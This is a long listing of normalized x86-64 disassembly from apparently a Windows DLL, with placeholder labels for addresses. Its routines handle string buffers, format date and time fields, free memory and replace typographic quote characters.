mov [ rcx + 0x258 ] rax
mov [ rcx + 0x260 ] 0x7
mov [ rcx + 0x248 ] ax
mov [ rcx + 0x280 ] rax
mov [ rcx + 0x288 ] 0x7
mov [ rcx + 0x270 ] ax
mov [ rcx + 0x2a8 ] rax
mov [ rcx + 0x2b0 ] 0x7
mov [ rcx + 0x298 ] ax
mov [ rcx + 0x2d0 ] rax
mov [ rcx + 0x2d8 ] 0x7
mov [ rcx + 0x2c0 ] ax
mov [ rcx + 0x2f8 ] rax
mov [ rcx + 0x300 ] 0x7
mov [ rcx + 0x2e8 ] ax
mov [ rcx + 0x328 ] rax
mov [ rcx + 0x330 ] 0x7
mov [ rcx + 0x318 ] ax
mov [ rcx + 0x350 ] rax
mov [ rcx + 0x358 ] 0x7
mov [ rcx + 0x340 ] ax
mov [ rcx + 0x378 ] rax
mov [ rcx + 0x380 ] 0x7
mov [ rcx + 0x368 ] ax
mov [ rcx + 0x3a0 ] rax
mov [ rcx + 0x3a8 ] 0x7
mov [ rcx + 0x390 ] ax
mov [ rcx + 0x3d0 ] rax
mov [ rcx + 0x3d8 ] 0x7
mov [ rcx + 0x3c0 ] ax
mov [ rcx + 0x400 ] rax
mov [ rcx + 0x408 ] 0x7
mov [ rcx + 0x3f0 ] ax
mov rax rcx
retn
sub_18000c200
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x6f8 ]
sub rsp 0x7f8
mov [ rbp + 0x140 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x6e8 ] rax
mov r15 r9
mov [ rsp + 0x48 ] r9
mov r14 r8
mov [ rsp + 0x58 ] rcx
mov [ rsp + 0x34 ] edx
mov [ rbp + 0x260 ] r8
mov [ rbp + 0x268 ] r9
mov rbx [ rbp + 0x760 ]
xor r12d r12d
mov esi r12d
mov [ rsp + 0x30 ] r12d
lea rcx [ rbp + 0x2a0 ]
call sub_18000bfa0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r15
lea rcx [ rbp + 0x2d0 ]
call sub_180002260
mov r11d [ rsp + 0x34 ]
mov [ rbp + 0x2a0 ] r11d
mov [ rsp + 0x44 ] 0x2
mov [ rsp + 0x40 ] r12d
mov [ rsp + 0x38 ] r12
mov dil 0x1
mov [ rbp + 0x6c0 ] r12b
xor eax eax
mov [ rbp + 0x6c1 ] rax
mov [ rbp + 0x6c9 ] eax
mov [ rbp + 0x6cd ] ax
mov [ rbp + 0x6cf ] al
lea rax [ rsp + 0x38 ]
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x50 ]
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x44 ]
mov rcx rbx
call [ rw-data ]
test eax eax
jne r-xdata
lea rcx [ rbp + 0x2a0 ]
call sub_18000a420
nop
cmp [ r14 + 0x18 ] 0x8
jb r-xdata
mov rax [ rsp + 0x38 ]
movzx ecx [ rax + 0x3c ]
movzx r13d [ rax + 0x34 ]
cmp cx r13w
cmovb r13w cx
shr r13w 0x4
mov r12d 0x1
mov [ r14 + 0x18 ] 0x7
mov [ r14 + 0x10 ] r12
mov [ r14 ] r12w
cmp [ r15 + 0x18 ] 0x8
jb r-xdata
mov rcx [ r14 ]
call j_sub_180018b3c
mov rcx [ rsp + 0x38 ]
call [ LocalFree@IAT ]
xor r12d r12d
lea rbx [ r--data ]
lea rdx [ r--data ]
lea rcx [ r--data ]
test dil dil
je r-xdata
mov [ r15 + 0x18 ] 0x7
mov [ r15 + 0x10 ] r12
mov [ r15 ] r12w
movzx eax dil
mov rcx [ rbp + 0x6e8 ]
xor rcx rsp
call sub_180018450
add rsp 0x7f8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ r15 ]
call j_sub_180018b3c
mov [ rbp + 0x150 ] rcx
or esi 0x1
mov [ rsp + 0x30 ] esi
mov [ rbp + 0x1d8 ] rdx
lea rcx [ rbp + 0x1d8 ]
call sub_180003960
lea r11 [ rbp + 0x158 ]
mov [ rbp + 0x220 ] r11
xor edi edi
mov [ rbp + 0x228 ] rdi
lea rcx [ rbp + 0x1d8 ]
call sub_180005300
mov [ rbp + 0x230 ] ax
cmp [ rbp + 0x220 ] rdi
jne r-xdata
mov rax [ rbp + 0x150 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rbp + rcx + 0x150 ] rax
lea rcx [ rbp + 0x158 ]
call sub_1800050e0
nop
mov [ rbp + 0x158 ] rbx
mov [ rbp + 0x1c8 ] rdi
mov [ rbp + 0x1d0 ] 0x4
mov rdx r14
lea rcx [ rbp + 0x150 ]
call sub_18000def0
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
mov rcx rax
movzx edx r12w
call sub_18000d590
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
lea rdx [ rbp + 0x270 ]
lea rcx [ rbp + 0x150 ]
call sub_18000ddd0
mov rbx rax
lea rax [ rbp + 0x2a8 ]
cmp rax rbx
je r-xdata
mov edx [ rbp + 0x1e8 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp + 0x1d8 ]
call sub_1800037f0
nop
cmp [ rbp + 0x288 ] 0x8
jb r-xdata
cmp [ rbp + 0x2c0 ] 0x8
jb r-xdata
mov [ rbp + 0x288 ] 0x7
mov [ rbp + 0x280 ] rdi
mov [ rbp + 0x270 ] di
movzx ecx r12w
movzx eax r13w
add ecx eax
movsxd rdx ecx
add rdx rdx
mov rax [ rsp + 0x38 ]
lea rcx [ rax + rdx * 8 + 0x44 ]
lea r8 [ rbp + 0x6c0 ]
lea rdx [ rsp + 0x34 ]
call [ rw-data ]
test eax eax
jne r-xdata
mov rcx [ rbp + 0x270 ]
call j_sub_180018b3c
mov [ rbp + 0x2c0 ] 0x7
mov [ rbp + 0x2b8 ] rdi
mov [ rbp + 0x2a8 ] di
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp + 0x2a8 ]
call j_sub_180018b3c
mov [ rbp + 0x658 ] 0x0
lea rax [ rbp + 0x660 ]
mov r9 [ rbp + 0x660 ]
mov rdx [ rbp + 0x678 ]
cmp rdx 0x8
cmovae rax r9
mov r8 [ rbp + 0x670 ]
lea rcx [ r--data ]
cmp rcx rax
jb r-xdata
lea rax [ r--data ]
mov [ rsp + 0x60 ] rax
or esi 0x4
mov [ rsp + 0x30 ] esi
lea rax [ r--data ]
mov [ rbp - 0x18 ] rax
lea rcx [ rbp - 0x18 ]
call sub_180003960
lea r11 [ rsp + 0x68 ]
mov [ rbp + 0x30 ] r11
mov [ rbp + 0x38 ] rdi
lea rcx [ rbp - 0x18 ]
call sub_180005300
mov [ rbp + 0x40 ] ax
cmp [ rbp + 0x30 ] 0x0
jne r-xdata
mov rax [ rbx ]
mov [ rbp + 0x2a8 ] rax
mov [ rbx ] rdi
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
lea rcx [ rbp + 0x2a8 ]
call sub_180018670
jmp r-xdata
mov ebx 0x14
cmp rdx rbx
jae r-xdata
lea rax [ rbp + 0x660 ]
cmp rdx 0x8
cmovae rax r9
lea rax [ rax + r8 * 2 ]
cmp rax rcx
jbe r-xdata
mov rax [ rsp + 0x60 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x60 ] rax
lea rcx [ rsp + 0x68 ]
call sub_1800050e0
nop
lea rax [ r--data ]
mov [ rsp + 0x68 ] rax
mov [ rbp - 0x28 ] rdi
mov [ rbp - 0x20 ] 0x4
lea rbx [ rbp + 0x6c0 ]
mov edi 0x10
lea r15d [ rdi + 0x20 ]
nop [ rax + rax ] ax
mov edx [ rbp - 0x8 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp - 0x18 ]
call sub_1800037f0
nop
mov rax [ rbx + 0x10 ]
mov [ rbp + 0x2b8 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp + 0x2c0 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
lea rcx [ rbp + 0x660 ]
cmp rdx 0x8
cmovae rcx r9
mov rax [ r--data ]
mov [ rcx ] rax
mov rax [ r--data ]
mov [ rcx + 0x8 ] rax
mov rax [ r--data ]
mov [ rcx + 0x10 ] rax
mov rax [ r--data ]
mov [ rcx + 0x18 ] rax
mov rax [ r--data ]
mov [ rcx + 0x20 ] rax
mov [ rbp + 0x670 ] rbx
lea rax [ rbp + 0x660 ]
cmp [ rbp + 0x678 ] 0x8
cmovae rax [ rbp + 0x660 ]
mov [ rax + 0x28 ] di
mov edx ebx
lea rcx [ rbp + 0x660 ]
call sub_1800027d0
mov rdx [ rbp + 0x678 ]
mov r9 [ rbp + 0x660 ]
lea rax [ rbp + 0x660 ]
cmp rdx 0x8
cmovae rax r9
mov rbx rcx
sub rbx rax
sar rbx 0x1
cmp r8 rbx
jb r-xdata
mov edx 0x2
lea rcx [ rbp + 0x240 ]
call sub_180017d60
mov r11 rax
mov rax [ rsp + 0x60 ]
movsxd rcx [ rax + 0x4 ]
lea rcx [ rsp + rcx + 0x60 ]
mov rdx [ r11 + 0x8 ]
call [ r11 ]
mov r11 [ rsp + 0x60 ]
movsxd rax [ r11 + 0x4 ]
mov [ rbp + rax - 0x48 ] r15w
mov rax [ rsp + 0x60 ]
movsxd rcx [ rax + 0x4 ]
and [ rsp + rcx + 0x78 ] 0xfffff9ff
or [ rsp + rcx + 0x78 ] 0x800
movzx edx [ rbx ]
lea rcx [ rsp + 0x60 ]
call sub_18000d770
inc rbx
dec rdi
jne r-xdata
mov r15 [ rsp + 0x48 ]
mov [ rbp + 0x658 ] 0x1
lea rdx [ rbp + 0x270 ]
lea rcx [ rsp + 0x60 ]
call sub_18000ddd0
mov rbx rax
lea rax [ rbp + 0x660 ]
cmp rax rbx
je r-xdata
mov [ rbp + 0x688 ] 0x0
lea rax [ rbp + 0x690 ]
mov r9 [ rbp + 0x690 ]
mov rdx [ rbp + 0x6a8 ]
cmp rdx 0x8
cmovae rax r9
mov r8 [ rbp + 0x6a0 ]
lea rcx [ r--data ]
cmp rcx rax
jb r-xdata
lea rax [ r--data ]
mov [ rbp + 0x50 ] rax
or esi 0x10
mov [ rsp + 0x30 ] esi
lea rax [ r--data ]
mov [ rbp + 0xd8 ] rax
lea rcx [ rbp + 0xd8 ]
call sub_180003960
lea r11 [ rbp + 0x58 ]
mov [ rbp + 0x120 ] r11
mov [ rbp + 0x128 ] rdi
lea rcx [ rbp + 0xd8 ]
call sub_180005300
mov [ rbp + 0x130 ] ax
cmp [ rbp + 0x120 ] 0x0
jne r-xdata
lea rcx [ r--data ]
call sub_180016ebc
sub r8 rbx
cmp r8 0x14
mov eax 0x14
cmova r8 rax
lea rdx [ r8 + rbx ]
or r8 0xffffffffffffffff
lea rcx [ rbp + 0x660 ]
call sub_1800024a0
mov r8 rbx
xor edx edx
lea rcx [ rbp + 0x660 ]
call sub_1800024a0
mov ebx 0x14
jmp r-xdata
xor edi edi
cmp [ rbp + 0x678 ] 0x8
jb r-xdata
cmp rdx 0x14
jae r-xdata
lea rax [ rbp + 0x690 ]
cmp rdx 0x8
cmovae rax r9
lea rax [ rax + r8 * 2 ]
cmp rax rcx
jbe r-xdata
mov rax [ rbp + 0x50 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rbp + rcx + 0x50 ] rax
lea rcx [ rbp + 0x58 ]
call sub_1800050e0
nop
lea rax [ r--data ]
mov [ rbp + 0x58 ] rax
mov [ rbp + 0xc8 ] rdi
mov [ rbp + 0xd0 ] 0x4
lea rbx [ rbp + 0x6c0 ]
mov edi 0x10
lea r15d [ rdi + 0x20 ]
mov edx [ rbp + 0xe8 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp + 0xd8 ]
call sub_1800037f0
nop
movzx ecx r12w
add rcx rcx
mov rax [ rsp + 0x38 ]
lea rcx [ rax + rcx * 8 + 0x44 ]
lea r8 [ rbp + 0x6c0 ]
lea rdx [ rsp + 0x34 ]
call [ rw-data ]
test eax eax
jne r-xdata
lea rcx [ rbp - 0x18 ]
call sub_18000dd20
lea r11 [ r--data ]
mov [ rbp - 0x18 ] r11
lea rcx [ rbp - 0x18 ]
call sub_180017208
mov ebx 0x14
jmp r-xdata
mov rcx [ rbp + 0x270 ]
call j_sub_180018b3c
nop
mov [ rbp + 0x678 ] 0x7
xor edi edi
mov [ rbp + 0x670 ] rdi
mov [ rbp + 0x660 ] di
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp + 0x660 ]
call j_sub_180018b3c
lea rcx [ rbp + 0x690 ]
cmp rdx 0x8
cmovae rcx r9
mov rax [ r--data ]
mov [ rcx ] rax
mov rax [ r--data ]
mov [ rcx + 0x8 ] rax
mov rax [ r--data ]
mov [ rcx + 0x10 ] rax
mov rax [ r--data ]
mov [ rcx + 0x18 ] rax
mov rax [ r--data ]
mov [ rcx + 0x20 ] rax
mov [ rbp + 0x6a0 ] rbx
lea rax [ rbp + 0x690 ]
cmp [ rbp + 0x6a8 ] 0x8
cmovae rax [ rbp + 0x690 ]
mov [ rax + 0x28 ] di
mov rdx rbx
lea rcx [ rbp + 0x690 ]
call sub_1800027d0
mov rdx [ rbp + 0x6a8 ]
mov r9 [ rbp + 0x690 ]
lea rax [ rbp + 0x690 ]
cmp rdx 0x8
cmovae rax r9
mov rbx rcx
sub rbx rax
sar rbx 0x1
cmp r8 rbx
jb r-xdata
mov edx 0x2
lea rcx [ rbp + 0x250 ]
call sub_180017d60
mov r11 rax
mov rax [ rbp + 0x50 ]
movsxd rcx [ rax + 0x4 ]
lea rcx [ rbp + rcx + 0x50 ]
mov rdx [ r11 + 0x8 ]
call [ r11 ]
mov r11 [ rbp + 0x50 ]
movsxd rax [ r11 + 0x4 ]
mov [ rbp + rax + 0xa8 ] r15w
mov rax [ rbp + 0x50 ]
movsxd rcx [ rax + 0x4 ]
and [ rbp + rcx + 0x68 ] 0xfffff9ff
or [ rbp + rcx + 0x68 ] 0x800
movzx edx [ rbx ]
lea rcx [ rbp + 0x50 ]
call sub_18000d770
inc rbx
dec rdi
jne r-xdata
mov r15 [ rsp + 0x48 ]
mov [ rbp + 0x688 ] 0x1
lea rdx [ rbp + 0x270 ]
lea rcx [ rbp + 0x50 ]
call sub_18000ddd0
mov rbx rax
lea rax [ rbp + 0x690 ]
cmp rax rbx
je r-xdata
mov rax [ rbx ]
mov [ rbp + 0x660 ] rax
mov [ rbx ] rdi
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
lea rcx [ rbp + 0x660 ]
call sub_180018670
jmp r-xdata
cmp r12w r13w
jae r-xdata
lea rcx [ r--data ]
call sub_180016ebc
sub r8 rbx
cmp r8 0x14
mov eax 0x14
cmova r8 rax
lea rdx [ r8 + rbx ]
or r8 0xffffffffffffffff
lea rcx [ rbp + 0x690 ]
call sub_1800024a0
mov r8 rbx
xor edx edx
lea rcx [ rbp + 0x690 ]
call sub_1800024a0
jmp r-xdata
cmp [ rbp + 0x288 ] 0x8
jb r-xdata
cmp [ rbp + 0x6a8 ] 0x8
jb r-xdata
cmp [ rbp + 0x288 ] 0x8
jb r-xdata
mov rax [ rbx + 0x10 ]
mov [ rbp + 0x670 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp + 0x678 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
jmp r-xdata
movzx r9d [ rbp + 0x770 ]
lea r8 [ rbp + 0x2a0 ]
mov edx [ rbp + 0x768 ]
mov rcx [ rsp + 0x58 ]
call sub_18000a8b0
movzx edi al
lea rcx [ rbp + 0x1d8 ]
call sub_18000dd20
lea rax [ r--data ]
mov [ rbp + 0x1d8 ] rax
lea rcx [ rbp + 0x1d8 ]
call sub_180017208
inc r12w
jmp r-xdata
lea rcx [ rbp + 0xd8 ]
call sub_18000dd20
lea rax [ r--data ]
mov [ rbp + 0xd8 ] rax
lea rcx [ rbp + 0xd8 ]
call sub_180017208
jmp r-xdata
mov rcx [ rbp + 0x270 ]
call j_sub_180018b3c
nop
mov [ rbp + 0x6a8 ] 0x7
xor edi edi
mov [ rbp + 0x6a0 ] rdi
mov [ rbp + 0x690 ] di
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp + 0x690 ]
call j_sub_180018b3c
mov rax [ rbx ]
mov [ rbp + 0x690 ] rax
mov [ rbx ] rdi
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
lea rcx [ rbp + 0x690 ]
call sub_180018670
jmp r-xdata
mov rax [ rbx + 0x10 ]
mov [ rbp + 0x6a0 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp + 0x6a8 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
sub_18000cce0
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
push r12
push r13
lea rbp [ rsp - 0x30 ]
sub rsp 0x130
mov [ rbp + 0x10 ] 0xfffffffffffffffe
mov [ rsp + 0x170 ] rbx
mov rsi rdx
mov rdi rcx
xor ebx ebx
mov [ rbp + 0x68 ] ebx
lea rax [ r--data ]
mov [ rsp + 0x20 ] rax
mov [ rbp + 0x68 ] 0x2
lea rax [ r--data ]
mov [ rbp - 0x58 ] rax
lea rcx [ rbp - 0x58 ]
call sub_180003960
lea r11 [ rsp + 0x28 ]
mov [ rbp - 0x10 ] r11
mov [ rbp - 0x8 ] rbx
lea rcx [ rbp - 0x58 ]
call sub_180005300
mov [ rbp ] ax
cmp [ rbp - 0x10 ] rbx
jne r-xdata
mov rax [ rsp + 0x20 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x20 ] rax
lea rcx [ rsp + 0x28 ]
call sub_1800050e0
nop
lea rax [ r--data ]
mov [ rsp + 0x28 ] rax
mov [ rbp - 0x68 ] rbx
mov [ rbp - 0x60 ] 0x4
mov r12 [ rsi + 0x8 ]
cmp bx [ rsi ]
jae r-xdata
mov edx [ rbp - 0x48 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp - 0x58 ]
call sub_1800037f0
nop
mov rdx rdi
lea rcx [ rsp + 0x20 ]
call sub_18000ddd0
mov [ rbp + 0x68 ] 0x3
lea rcx [ rbp - 0x58 ]
call sub_18000dd20
lea r11 [ r--data ]
mov [ rbp - 0x58 ] r11
lea rcx [ rbp - 0x58 ]
call sub_180017208
mov rax rdi
mov rbx [ rsp + 0x170 ]
add rsp 0x130
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r13d 0x30
nop [ rax + rax ] ax
mov edx 0x2
lea rcx [ rbp + 0x18 ]
call sub_180017d60
mov rcx [ rsp + 0x20 ]
movsxd rdx [ rcx + 0x4 ]
lea rcx [ rsp + rdx + 0x20 ]
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rsp + 0x20 ]
movsxd rax [ r11 + 0x4 ]
mov [ rsp + rax + 0x78 ] r13w
mov rax [ rsp + 0x20 ]
movsxd rcx [ rax + 0x4 ]
and [ rsp + rcx + 0x38 ] 0xfffff9ff
or [ rsp + rcx + 0x38 ] 0x800
movzx edx [ r12 ]
lea rcx [ rsp + 0x20 ]
call sub_18000d770
inc ebx
inc r12
movzx eax [ rsi ]
cmp ebx eax
jl r-xdata
sub_18000ce80
push rbp
push rsi
push rdi
push r12
push r13
lea rbp [ rsp - 0xb0 ]
sub rsp 0x1b0
mov [ rbp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x1f0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0xa8 ] rax
movzx esi r8b
mov rdi rdx
mov r12 rcx
mov [ rbp + 0x28 ] rcx
xor ebx ebx
mov [ rsp + 0x20 ] ebx
lea rax [ r--data ]
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] 0x2
lea rax [ r--data ]
mov [ rbp - 0x48 ] rax
lea rcx [ rbp - 0x48 ]
call sub_180003960
lea r11 [ rsp + 0x38 ]
mov [ rbp ] r11
mov [ rbp + 0x8 ] rbx
lea rcx [ rbp - 0x48 ]
call sub_180005300
mov [ rbp + 0x10 ] ax
cmp [ rbp ] rbx
jne r-xdata
mov rax [ rsp + 0x30 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x30 ] rax
lea rcx [ rsp + 0x38 ]
call sub_1800050e0
nop
lea rax [ r--data ]
mov [ rsp + 0x38 ] rax
mov [ rbp - 0x58 ] rbx
mov [ rbp - 0x50 ] 0x4
mov eax [ rdi ]
cmp eax 0xffffffff
jne r-xdata
mov edx [ rbp - 0x38 ]
or edx 0x4
xor r8d r8d
lea rcx [ rbp - 0x48 ]
call sub_1800037f0
nop
test eax eax
jne r-xdata
cmp [ rdi + 0x4 ] 0x7fffffff
jne r-xdata
lea rdx [ rbp + 0x90 ]
mov rcx rdi
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
cmp [ rdi + 0x4 ] eax
jne r-xdata
test sil sil
jne r-xdata
mov rdx r12
lea rcx [ rsp + 0x30 ]
call sub_18000ddd0
mov [ rsp + 0x20 ] 0x3
lea rcx [ rbp - 0x48 ]
call sub_18000dd20
lea r11 [ r--data ]
mov [ rbp - 0x48 ] r11
lea rcx [ rbp - 0x48 ]
call sub_180017208
mov rax r12
mov rcx [ rbp + 0xa8 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x1f0 ]
add rsp 0x1b0
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rax [ rsp + 0x30 ]
movsxd rcx [ rax + 0x4 ]
and [ rsp + rcx + 0x48 ] 0xfffff3ff
or [ rsp + rcx + 0x48 ] 0x200
mov edx 0x2
lea rcx [ rbp + 0x80 ]
call sub_180017d60
mov rcx [ rsp + 0x30 ]
movsxd rdx [ rcx + 0x4 ]
lea rcx [ rsp + rdx + 0x30 ]
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rsp + 0x30 ]
movsxd rax [ r11 + 0x4 ]
mov r13d 0x30
mov [ rbp + rax - 0x78 ] r13w
lea edx [ r13 - 0x2e ]
lea rcx [ rbp + 0x30 ]
call sub_180017d60
mov rsi rax
movzx edx [ rbp + 0x96 ]
lea rcx [ rsp + 0x30 ]
call sub_18000d590
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
mov rdi rax
test rax rax
jne r-xdata
test sil sil
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_180008ab0
jmp r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
mov rcx rbx
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
call sub_180008ab0
jmp r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
mov rcx rbx
jmp r-xdata
mov rdx [ rsi + 0x8 ]
call [ rsi ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r13w
mov edx 0x4
lea rcx [ rbp + 0x60 ]
call sub_180017d60
mov rsi rax
movzx edx [ rbp + 0x92 ]
mov rcx rdi
call sub_18000d590
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
mov rdi rax
test rax rax
jne r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
mov rcx rbx
jmp r-xdata
mov rdx [ rsi + 0x8 ]
call [ rsi ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r13w
mov edx 0x2
lea rcx [ rbp + 0x40 ]
call sub_180017d60
mov rsi rax
movzx edx [ rbp + 0x90 ]
mov rcx rdi
call sub_18000d590
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
mov rdi rax
test rax rax
jne r-xdata
mov rax [ rax ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
mov rcx rbx
jmp r-xdata
mov rdx [ rsi + 0x8 ]
call [ rsi ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r13w
mov edx 0x2
lea rcx [ rbp + 0x50 ]
call sub_180017d60
mov rsi rax
movzx edx [ rbp + 0x98 ]
mov rcx rdi
call sub_18000d590
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
mov rdi rax
test rax rax
jne r-xdata
mov rdx [ rsi + 0x8 ]
mov rcx rbx
call [ rsi ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r13w
movzx edx [ rbp + 0x9c ]
mov rcx rdi
call sub_18000d590
mov rax [ rax ]
movsxd rbx [ rax + 0x4 ]
add rbx rdi
mov rdx [ rsi + 0x8 ]
call [ rsi ]
mov r11 [ rdi ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rdi + 0x58 ] r13w
mov edx 0x2
lea rcx [ rbp + 0x70 ]
call sub_180017d60
mov rsi rax
movzx edx [ rbp + 0x9a ]
mov rcx rdi
call sub_18000d590
mov rcx rax
lea rdx [ r--data ]
call sub_180008ab0
mov rdi rax
test rax rax
je r-xdata
sub_18000d250
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
xor eax eax
mov [ rsp + 0x48 ] eax
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
mov [ rsp + 0x48 ] 0x1
cmp [ rdx + 0x10 ] rax
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
lea r8d [ rax + 0x1 ]
lea rdx [ r--data ]
call sub_1800023b0
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
mov rcx rbx
call sub_180002070
mov r8d 0x1
lea rdx [ r--data ]
mov rcx rbx
call sub_180002150
sub_18000d2e0
mov [ rsp + 0x18 ] rbx
push rsi
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
xor ebx ebx
mov rsi rcx
mov [ rsp + 0x20 ] 0x20132019
mov [ rsp + 0x24 ] 0xbb00ab
mov [ rsp + 0x28 ] 0x2026
mov [ rsp + 0x30 ] 0x2d0027
mov [ rsp + 0x34 ] 0x220022
mov [ rsp + 0x38 ] 0x2e
cmp [ rcx + 0x10 ] rbx
jbe r-xdata
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x70 ]
add rsp 0x50
pop rsi
retn
mov [ rsp + 0x68 ] rdi
xor edi edi
nop [ rax ] eax
add rdx 0x2
dec r8
jne r-xdata
movzx ecx [ rsp + rdx + 0x21 ]
cmp [ r11 + 0x1 ] cl
jne r-xdata
movzx ecx [ rsp + rdx + 0x20 ]
cmp [ r11 ] cl
jne r-xdata
inc ebx
add rdi 0x2
mov eax ebx
cmp rax [ rsi + 0x10 ]
jb r-xdata
movzx eax [ rsp + rdx + 0x30 ]
mov [ r11 ] al
movzx eax [ rsp + rdx + 0x31 ]
mov [ r11 + 0x1 ] al
mov rcx rsi
call sub_180004210
xor edx edx
lea r11 [ rdi + rax ]
lea r8d [ rdx + 0x5 ]
mov rdi [ rsp + 0x68 ]
sub_18000d3b0
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rsp + 0xa8 ] rbx
movzx r14d dl
mov rbx rcx
xor edi edi
mov [ rsp + 0xb0 ] edi
mov [ rsp + 0x50 ] rcx
mov rax [ rcx ]
movsxd r8 [ rax + 0x4 ]
mov rcx [ r8 + rcx + 0x48 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
cmp [ rcx + rbx + 0x10 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rcx [ rbx ]
movsxd rax [ rcx + 0x4 ]
cmp [ rax + rbx + 0x10 ] 0x0
sete al
mov [ rsp + 0x58 ] al
test al al
je r-xdata
mov rcx [ rcx + rbx + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
movsxd rcx [ rcx + 0x4 ]
add rcx rbx
lea rdx [ rsp + 0x30 ]
call sub_180003910
nop
mov rcx rax
call sub_180008f80
mov r13 rax
mov r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
call sub_180003da0
call j_sub_18001c100
test al al
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbx ]
movsxd r9 [ rax + 0x4 ]
add r9 rbx
mov rax [ r9 + 0x48 ]
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x48 ] rax
movzx eax [ r9 + 0x58 ]
movaps xmm0 [ rsp + 0x40 ]
movdqa [ rsp + 0x40 ] xmm0
mov r10 [ r13 ]
mov [ rsp + 0x28 ] r14b
mov [ rsp + 0x20 ] ax
lea r8 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov rcx r13
call [ r10 + 0x40 ]
mov eax 0x4
cmp [ rsp + 0x60 ] 0x0
cmovne edi eax
mov [ rsp + 0xb0 ] edi
jmp r-xdata
xor edx edx
lea rcx [ rsp + 0xb8 ]
call sub_18001775c
mov rax [ r12 + 0x8 ]
test rax rax
je r-xdata
